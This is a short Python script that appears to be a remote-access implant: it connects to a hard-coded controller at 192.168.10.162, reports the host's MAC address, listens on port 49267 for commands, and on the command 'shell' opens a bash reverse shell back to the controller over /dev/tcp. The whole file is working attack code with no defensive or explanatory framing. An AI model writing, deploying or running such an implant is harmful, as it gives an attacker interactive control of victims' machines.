import socket
import uuid
import subprocess
import os

SERVER_IP = "192.168.10.162"
SERVER_PORT = 12345
LISTEN_PORT = 49267  # The port to listen on

def get_mac_address():
    mac_num = hex(uuid.getnode()).replace('0x', '')
    mac = ':'.join(mac_num[i: i + 2] for i in range(0, 11, 2))
    return mac

def listen_commands():
    listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_socket.bind(('0.0.0.0', LISTEN_PORT))
    listen_socket.listen(1)
    print(f"Listening on port {LISTEN_PORT}")
    while True:
        client_socket, addr = listen_socket.accept()
        command = client_socket.recv(4096).decode()
        print(f"Received command: {command}")  # Debugging statement
        if command == 'shell':
            print("Executing reverse shell")  # Debugging statement
            try:
                subprocess.run(['bash', '-c', 'bash -i >& /dev/tcp/192.168.10.162/6212 0>&1'], check=True)
            except subprocess.CalledProcessError as e:
                print(f"Error executing reverse shell: {e}")
        client_socket.close()

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_IP, SERVER_PORT))

    # Send MAC address to server
    mac_address = get_mac_address()
    client_socket.send(mac_address.encode())

    # Keep the socket open to listen for commands
    listen_commands()

if __name__ == "__main__":
    main()